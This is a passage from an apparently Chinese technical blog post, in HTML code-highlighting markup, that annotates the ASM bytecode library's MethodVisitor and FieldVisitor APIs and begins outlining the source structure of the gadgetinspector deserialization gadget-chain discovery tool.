class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 启动对方法代码的访问，如果有的话（即非抽象方法）</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">visitCode</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="comment">/**</span></span></span><br><span class="line"><span class="function"><span class="comment"> * 访问局部变量和操作数堆栈元素的当前状态</span></span></span><br><span class="line"><span class="function"><span class="comment"> *</span></span></span><br><span class="line"><span class="function"><span class="comment"> * @paramtype堆栈映射帧的类型（stack map frame）</span></span></span><br><span class="line"><span class="function"><span class="comment"> * @paramnumLocal被访问帧中的局部变量数量</span></span></span><br><span class="line"><span class="function"><span class="comment"> * @paramlocal被访问帧中的局部变量类型</span></span></span><br><span class="line"><span class="function"><span class="comment"> * @paramnumStack被访问帧中的操作数堆栈元素个数</span></span></span><br><span class="line"><span class="function"><span class="comment"> * @paramstack被访问帧中的操作数堆栈元素类型</span></span></span><br><span class="line"><span class="function"><span class="comment"> * @return</span></span></span><br><span class="line"><span class="function"><span class="comment"> */</span></span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">visitFrame</span><span class="params">(<span class="keyword">int</span> type, <span class="keyword">int</span> numLocal, java.lang.Object[] local, <span class="keyword">int</span> numStack, java.lang.Object[] stack)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="comment">/**</span></span></span><br><span class="line"><span class="function"><span class="comment"> * 访问零操作数的指令</span></span></span><br><span class="line"><span class="function"><span class="comment"> *</span></span></span><br><span class="line"><span class="function"><span class="comment"> * @paramopcode要访问的指令的操作码</span></span></span><br><span class="line"><span class="function"><span class="comment"> * @return</span></span></span><br><span class="line"><span class="function"><span class="comment"> */</span></span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">visitInsn</span><span class="params">(<span class="keyword">int</span> opcode)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="comment">/**</span></span></span><br><span class="line"><span class="function"><span class="comment"> * 访问单个 int 类型操作数的指令</span></span></span><br><span class="line"><span class="function"><span class="comment"> *</span></span></span><br><span class="line"><span class="function"><span class="comment"> * @paramopcode要访问的指令的操作码：BIPUSH、SIPUSH、NEWARRAY</span></span></span><br><span class="line"><span class="function"><span class="comment"> * @paramoperand要访问的指令的操作数</span></span></span><br><span class="line"><span class="function"><span class="comment"> * @return</span></span></span><br><span class="line"><span class="function"><span class="comment"> */</span></span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">visitIntInsn</span><span class="params">(<span class="keyword">int</span> opcode, <span class="keyword">int</span> operand)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="comment">/**</span></span></span><br><span class="line"><span class="function"><span class="comment"> * 访问局部变量指令</span></span></span><br><span class="line"><span class="function"><span class="comment"> * 局部变量指令是加载或存储局部变量值的指令</span></span></span><br><span class="line"><span class="function"><span class="comment"> *</span></span></span><br><span class="line"><span class="function"><span class="comment"> * @paramopcode要访问的指令的操作码：ILOAD、LLOAD、FLOAD、DLOAD、ALOAD、ISTORE、LSTORE、FSTORE、DSTORE、ASTORE、RET</span></span></span><br><span class="line"><span class="function"><span class="comment"> * @paramvar要访问的指令的操作数（局部变量的下标）</span></span></span><br><span class="line"><span class="function"><span class="comment"> * @return</span></span></span><br><span class="line"><span class="function"><span class="comment"> */</span></span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">visitVarInsn</span><span class="params">(<span class="keyword">int</span> opcode, <span class="keyword">int</span> <span class="keyword">var</span>)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="comment">/**</span></span></span><br><span class="line"><span class="function"><span class="comment"> * 访问类型指令</span></span></span><br><span class="line"><span class="function"><span class="comment"> * 类型指令是以类的内部名称作为参数的指令</span></span></span><br><span class="line"><span class="function"><span class="comment"> *</span></span></span><br><span class="line"><span class="function"><span class="comment"> * @paramopcode要访问的指令的操作码：NEW、ANEWARRAY、CHECKCAST、INSTANCEOF</span></span></span><br><span class="line"><span class="function"><span class="comment"> * @paramtype要访问的指令的操作数（对象或数组类的内部名称）</span></span></span><br><span class="line"><span class="function"><span class="comment"> * @return</span></span></span><br><span class="line"><span class="function"><span class="comment"> */</span></span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">visitTypeInsn</span><span class="params">(<span class="keyword">int</span> opcode, java.lang.String type)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="comment">/**</span></span></span><br><span class="line"><span class="function"><span class="comment"> * 访问字段指令</span></span></span><br><span class="line"><span class="function"><span class="comment"> * 字段指令是加载或存储对象字段值的指令</span></span></span><br><span class="line"><span class="function"><span class="comment"> *</span></span></span><br><span class="line"><span class="function"><span class="comment"> * @paramopcode要访问的指令的操作码：GETSTATIC、PUTSTATIC、GETFIELD、PUTFIELD</span></span></span><br><span class="line"><span class="function"><span class="comment"> * @paramowner字段所有者类的内部名称</span></span></span><br><span class="line"><span class="function"><span class="comment"> * @paramname字段的名称</span></span></span><br><span class="line"><span class="function"><span class="comment"> * @paramdescriptor字段的描述符</span></span></span><br><span class="line"><span class="function"><span class="comment"> * @return</span></span></span><br><span class="line"><span class="function"><span class="comment"> */</span></span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">visitFieldInsn</span><span class="params">(<span class="keyword">int</span> opcode, java.lang.String owner, java.lang.String name, java.lang.String descriptor)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="comment">/**</span></span></span><br><span class="line"><span class="function"><span class="comment"> * 访问方法指令</span></span></span><br><span class="line"><span class="function"><span class="comment"> * 方法指令是调用方法的指令</span></span></span><br><span class="line"><span class="function"><span class="comment"> *</span></span></span><br><span class="line"><span class="function"><span class="comment"> * @paramopcode要访问的指令的操作码：INVOKEVIRTUAL、INVOKESPECIAL、INVOKESTATIC、INVOKEINTERFACE</span></span></span><br><span class="line"><span class="function"><span class="comment"> * @paramowner方法所有者类的内部名称</span></span></span><br><span class="line"><span class="function"><span class="comment"> * @paramname方法的名称</span></span></span><br><span class="line"><span class="function"><span class="comment"> * @paramdescriptor方法的描述符</span></span></span><br><span class="line"><span class="function"><span class="comment"> * @paramisInterface方法的所有者类是否为接口</span></span></span><br><span class="line"><span class="function"><span class="comment"> * @return</span></span></span><br><span class="line"><span class="function"><span class="comment"> */</span></span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">visitMethodInsn</span><span class="params">(<span class="keyword">int</span> opcode, java.lang.String owner, java.lang.String name, java.lang.String descriptor, <span class="keyword">boolean</span> isInterface)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="comment">/**</span></span></span><br><span class="line"><span class="function"><span class="comment"> * 访问 invokedynamic 指令</span></span></span><br><span class="line"><span class="function"><span class="comment"> *</span></span></span><br><span class="line"><span class="function"><span class="comment"> * @paramname方法的名称</span></span></span><br><span class="line"><span class="function"><span class="comment"> * @paramdescriptor方法的描述符</span></span></span><br><span class="line"><span class="function"><span class="comment"> * @parambootstrapMethodHandle引导方法</span></span></span><br><span class="line"><span class="function"><span class="comment"> * @parambootstrapMethodArguments引导方法的常量参数</span></span></span><br><span class="line"><span class="function"><span class="comment"> * @return</span></span></span><br><span class="line"><span class="function"><span class="comment"> */</span></span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">visitInvokeDynamicInsn</span><span class="params">(java.lang.String name, java.lang.String descriptor, Handle bootstrapMethodHandle, java.lang.Object... bootstrapMethodArguments)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="comment">/**</span></span></span><br><span class="line"><span class="function"><span class="comment"> * 访问跳转指令</span></span></span><br><span class="line"><span class="function"><span class="comment"> * 跳转指令是可以跳转到另一条指令的指令</span></span></span><br><span class="line"><span class="function"><span class="comment"> *</span></span></span><br><span class="line"><span class="function"><span class="comment"> * @paramopcode要访问的指令的操作码：IFEQ、IFNE、IFLT、IFGE、IFGT、IFLE、IF_ICMPEQ、IF_ICMPNE、IF_ICMPLT、IF_ICMPGE、IF_ICMPGT、IF_ICMPLE、IF_ACMPEQ、IF_ACMPNE、GOTO、JSR、IFNULL、IFNONNULL</span></span></span><br><span class="line"><span class="function"><span class="comment"> * @paramlabel要访问的指令的操作数（标签，指定跳转指令可以跳转到的指令）</span></span></span><br><span class="line"><span class="function"><span class="comment"> * @return</span></span></span><br><span class="line"><span class="function"><span class="comment"> */</span></span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">visitJumpInsn</span><span class="params">(<span class="keyword">int</span> opcode, Label label)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="comment">/**</span></span></span><br><span class="line"><span class="function"><span class="comment"> * 访问标签</span></span></span><br><span class="line"><span class="function"><span class="comment"> * 标签指定紧随其后的指令</span></span></span><br><span class="line"><span class="function"><span class="comment"> *</span></span></span><br><span class="line"><span class="function"><span class="comment"> * @paramlabel标签对象</span></span></span><br><span class="line"><span class="function"><span class="comment"> * @return</span></span></span><br><span class="line"><span class="function"><span class="comment"> */</span></span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">visitLabel</span><span class="params">(Label label)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="comment">/**</span></span></span><br><span class="line"><span class="function"><span class="comment"> * 访问 LDC 指令</span></span></span><br><span class="line"><span class="function"><span class="comment"> *</span></span></span><br><span class="line"><span class="function"><span class="comment"> * @paramvalue要加载到堆栈上的常数</span></span></span><br><span class="line"><span class="function"><span class="comment"> * @return</span></span></span><br><span class="line"><span class="function"><span class="comment"> */</span></span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">visitLdcInsn</span><span class="params">(java.lang.Object value)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="comment">/**</span></span></span><br><span class="line"><span class="function"><span class="comment"> * 访问 IINC 指令</span></span></span><br><span class="line"><span class="function"><span class="comment"> *</span></span></span><br><span class="line"><span class="function"><span class="comment"> * @paramvalue要递增的局部变量的索引</span></span></span><br><span class="line"><span class="function"><span class="comment"> * @paramincrement递增的数量</span></span></span><br><span class="line"><span class="function"><span class="comment"> * @return</span></span></span><br><span class="line"><span class="function"><span class="comment"> */</span></span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">visitIincInsn</span><span class="params">(<span class="keyword">int</span> <span class="keyword">var</span>, <span class="keyword">int</span> increment)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="comment">/**</span></span></span><br><span class="line"><span class="function"><span class="comment"> * 访问 TABLESWITCH 指令</span></span></span><br><span class="line"><span class="function"><span class="comment"> *</span></span></span><br><span class="line"><span class="function"><span class="comment"> * @parammin最小键值</span></span></span><br><span class="line"><span class="function"><span class="comment"> * @parammax最大键值</span></span></span><br><span class="line"><span class="function"><span class="comment"> * @paramdflt默认处理程序块的开始部分</span></span></span><br><span class="line"><span class="function"><span class="comment"> * @paramlabels处理程序块的开始</span></span></span><br><span class="line"><span class="function"><span class="comment"> * @return</span></span></span><br><span class="line"><span class="function"><span class="comment"> */</span></span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">visitTableSwitchInsn</span><span class="params">(<span class="keyword">int</span> min, <span class="keyword">int</span> max, Label dflt, Label... labels)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="comment">/**</span></span></span><br><span class="line"><span class="function"><span class="comment"> * 访问 LOOKUPSWITCH 指令</span></span></span><br><span class="line"><span class="function"><span class="comment"> *</span></span></span><br><span class="line"><span class="function"><span class="comment"> * @paramdflt默认处理程序块的开始部分</span></span></span><br><span class="line"><span class="function"><span class="comment"> * @paramkeys键值</span></span></span><br><span class="line"><span class="function"><span class="comment"> * @paramlabels处理程序块的开始</span></span></span><br><span class="line"><span class="function"><span class="comment"> * @return</span></span></span><br><span class="line"><span class="function"><span class="comment"> */</span></span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">visitLookupSwitchInsn</span><span class="params">(Label dflt, <span class="keyword">int</span>[] keys, Label[] labels)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="comment">/**</span></span></span><br><span class="line"><span class="function"><span class="comment"> * 访问 MULTIANEWARRAY 指令</span></span></span><br><span class="line"><span class="function"><span class="comment"> *</span></span></span><br><span class="line"><span class="function"><span class="comment"> * @paramdescriptor数组类型的描述符</span></span></span><br><span class="line"><span class="function"><span class="comment"> * @paramnumDimensions要分配的数组的维数</span></span></span><br><span class="line"><span class="function"><span class="comment"> * @return</span></span></span><br><span class="line"><span class="function"><span class="comment"> */</span></span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">visitMultiANewArrayInsn</span><span class="params">(java.lang.String descriptor, <span class="keyword">int</span> numDimensions)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="comment">/**</span></span></span><br><span class="line"><span class="function"><span class="comment"> * 访问指令上的注释</span></span></span><br><span class="line"><span class="function"><span class="comment"> * 必须在带注释的指令之后调用此方法，对同一指令可以多次调用</span></span></span><br><span class="line"><span class="function"><span class="comment"> *</span></span></span><br><span class="line"><span class="function"><span class="comment"> * @paramtypeRef对注释类型的引用</span></span></span><br><span class="line"><span class="function"><span class="comment"> * @paramtypePathtypeRef 中带注释的类型参数/通配符绑定/数组元素类型/静态内部类型的路径</span></span></span><br><span class="line"><span class="function"><span class="comment"> * @paramdescriptor注释类的描述符</span></span></span><br><span class="line"><span class="function"><span class="comment"> * @paramvisible运行时是否可见</span></span></span><br><span class="line"><span class="function"><span class="comment"> * @return</span></span></span><br><span class="line"><span class="function"><span class="comment"> */</span></span></span><br><span class="line"><span class="function"><span class="keyword">public</span> AnnotationVisitor <span class="title">visitInsnAnnotation</span><span class="params">(<span class="keyword">int</span> typeRef, TypePath typePath, java.lang.String descriptor, <span class="keyword">boolean</span> visible)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="comment">/**</span></span></span><br><span class="line"><span class="function"><span class="comment"> * 访问 try catch 块</span></span></span><br><span class="line"><span class="function"><span class="comment"> *</span></span></span><br><span class="line"><span class="function"><span class="comment"> * @paramstart异常处理程序范围的开始（包含）</span></span></span><br><span class="line"><span class="function"><span class="comment"> * @paramend异常处理程序范围的结束（不包含）</span></span></span><br><span class="line"><span class="function"><span class="comment"> * @paramhandler异常处理程序代码的开头</span></span></span><br><span class="line"><span class="function"><span class="comment"> * @paramtype由处理程序处理的异常类型的内部名称，或 null 来捕获任何异常（对 finally 块）</span></span></span><br><span class="line"><span class="function"><span class="comment"> * @return</span></span></span><br><span class="line"><span class="function"><span class="comment"> */</span></span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">visitTryCatchBlock</span><span class="params">(Label start, Label end, Label handler, java.lang.String type)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="comment">/**</span></span></span><br><span class="line"><span class="function"><span class="comment"> * 访问异常处理程序类型上的注释</span></span></span><br><span class="line"><span class="function"><span class="comment"> * 必须在 visitTryCatchBlock 之后调用，对同一个异常处理程序可以多次调用</span></span></span><br><span class="line"><span class="function"><span class="comment"> * </span></span></span><br><span class="line"><span class="function"><span class="comment"> * @paramtypeRef对注释类型的引用</span></span></span><br><span class="line"><span class="function"><span class="comment"> * @paramtypePathtypeRef 中带注释的类型参数/通配符绑定/数组元素类型/静态内部类型的路径</span></span></span><br><span class="line"><span class="function"><span class="comment"> * @paramdescriptor注释类的描述符</span></span></span><br><span class="line"><span class="function"><span class="comment"> * @paramvisible运行时是否可见</span></span></span><br><span class="line"><span class="function"><span class="comment"> * @return</span></span></span><br><span class="line"><span class="function"><span class="comment"> */</span></span></span><br><span class="line"><span class="function"><span class="keyword">public</span> AnnotationVisitor <span class="title">visitTryCatchAnnotation</span><span class="params">(<span class="keyword">int</span> typeRef, TypePath typePath, java.lang.String descriptor, <span class="keyword">boolean</span> visible)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="comment">/**</span></span></span><br><span class="line"><span class="function"><span class="comment"> * 访问方法的最大堆栈大小和最大局部变量数量</span></span></span><br><span class="line"><span class="function"><span class="comment"> * </span></span></span><br><span class="line"><span class="function"><span class="comment"> * @parammaxStack方法的最大堆栈大小</span></span></span><br><span class="line"><span class="function"><span class="comment"> * @parammaxLocals方法的最大局部变量数</span></span></span><br><span class="line"><span class="function"><span class="comment"> * @return</span></span></span><br><span class="line"><span class="function"><span class="comment"> */</span></span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">visitMaxs</span><span class="params">(<span class="keyword">int</span> maxStack, <span class="keyword">int</span> maxLocals)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="comment">/**</span></span></span><br><span class="line"><span class="function"><span class="comment"> * 访问方法的末尾</span></span></span><br><span class="line"><span class="function"><span class="comment"> * 该方法是最后一个被调用的方法，用于通知访问者该方法的所有注释和属性已经被访问</span></span></span><br><span class="line"><span class="function"><span class="comment"> */</span></span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">visitEnd</span><span class="params">()</span></span></span><br></pre></td></tr></table></figure><h4 id="3-FieldVisitor"><a href="#3-FieldVisitor" class="headerlink" title="3. FieldVisitor"></a>3. FieldVisitor</h4><p>方法调用顺序（访问顺序）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">( visitAnnotation | visitTypeAnnotation | visitAttribute )* visitEnd</span><br></pre></td></tr></table></figure><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p>JSRInlinerAdapter 用于简化代码分析，删除 JSR 指令并内联引用的子例程（没懂）</p><blockquote><p>A MethodVisitor that removes JSR instructions and inlines the referenced subroutines</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 构造函数</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>methodVisitor   将生成的内联方法代码发送到的方法访问者</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>access    方法的访问标志（Opcodes）</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>name    方法的名称</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>descriptor      方法的描述符</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>signature    方法的签名</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>exceptions      方法异常类的内部名称</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> JSRInlinerAdapter​(MethodVisitor methodVisitor,</span><br><span class="line">                         <span class="keyword">int</span> access,</span><br><span class="line">                         java.lang.String name,</span><br><span class="line">                         java.lang.String descriptor,</span><br><span class="line">                         java.lang.String signature,</span><br><span class="line">                         java.lang.String[] exceptions)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="0x02-项目结构"><a href="#0x02-项目结构" class="headerlink" title="0x02 项目结构"></a>0x02 项目结构</h1><p>项目中包含三种检测实现，在以下三个目录下：javaserial 针对 Java 原生序列化，jackson 针对 Jackson（JSON 库），xstream 针对 XStream（XML 库），同时在 config 目录下实现了各自的配置接口。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">├── config      <span class="comment"># 配置接口和具体实现</span></span><br><span class="line">│   ├── ConfigRepository.java</span><br><span class="line">│   ├── GIConfig.java</span><br><span class="line">│   ├── JacksonDeserializationConfig.java</span><br><span class="line">│   ├── JavaDeserializationConfig.java</span><br><span class="line">│   └── XstreamDeserializationConfig.java</span><br><span class="line">├── data        <span class="comment"># 数据的存储格式以及读取方法</span></span><br><span class="line">│   ├── ClassReference.java</span><br><span class="line">│   ├── DataFactory.java</span><br><span class="line">│   ├── DataLoader.java</span><br><span class="line">│   ├── GraphCall.java</span><br><span class="line">│   ├── InheritanceDeriver.java</span><br><span class="line">│   ├── InheritanceMap.java</span><br><span class="line">│   ├── MethodReference.java</span><br><span class="line">│   └── Source.java</span><br><span class="line">├── jackson     <span class="comment"># JSON 库</span></span><br><span class="line">│   ├── JacksonImplementationFinder.java</span><br><span class="line">│   ├── JacksonSerializableDecider.java</span><br><span class="line">│   └── JacksonSourceDiscovery.java</span><br><span class="line">├── javaserial  <span class="comment"># 原生序列化</span></span><br><span class="line">│   ├── SimpleImplementationFinder.java</span><br><span class="line">│   ├── SimpleSerializableDecider.java</span><br><span class="line">│   └── SimpleSourceDiscovery.java</span><br><span class="line">├── xstream     <span class="comment"># XML 库</span></span><br><span class="line">│   ├── CustomXstreamSerializableDecider.java</span><br><span class="line">│   └── XstreamSerializableDecider.java</span><br><span class="line">├── CallGraphDiscovery.java             <span class="comment"># 方法调用链中的污点参数传递关系</span></span><br><span class="line">├── ClassResourceEnumerator.java        <span class="comment"># 类枚举器</span></span><br><span class="line">├── GadgetChainDiscovery.java           <span class="comment"># 搜索利用链</span></span><br><span class="line">├── GadgetInspector.java                <span class="comment"># 主类，程序入口</span></span><br><span class="line">├── ImplementationFinder.java           <span class="comment"># 接口，获取目标方法的子类实现</span></span><br><span class="line">├── MethodDiscovery.java                <span class="comment"># 类信息、方法信息、继承信息</span></span><br><span class="line">├── PassthroughDiscovery.java           <span class="comment"># 方法的返回值与参数的关系</span></span><br><span class="line">├── SerializableDecider.java            <span class="comment"># 序列化决策者接口</span></span><br><span class="line">├── SourceDiscovery.java                <span class="comment"># 污点源信息</span></span><br><span class="line">├── TaintTrackingMethodVisitor.java     <span class="comment"># 方法访问者</span></span><br><span class="line">└── Util.java                           <span class="comment"># 工具函数</span></span><br></pre></td></tr></table></figure><h2 id="gadgetinspector-data"><a href="#gadgetinspector-data" class="headerlink" title="gadgetinspector/data"></a>gadgetinspector/data</h2><p>主要是数据格式的定义。</p><h3 id="1-DataLoader"><a href="#1-DataLoader" class="headerlink" title="1. DataLoader"></a>1. DataLoader</h3><p>定义了数据的读写方式，根据数据工厂方法（DataFactory）进行读写，<code>loadData</code> 返回的是动态数组，源码中多处调用进行数据遍历。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span 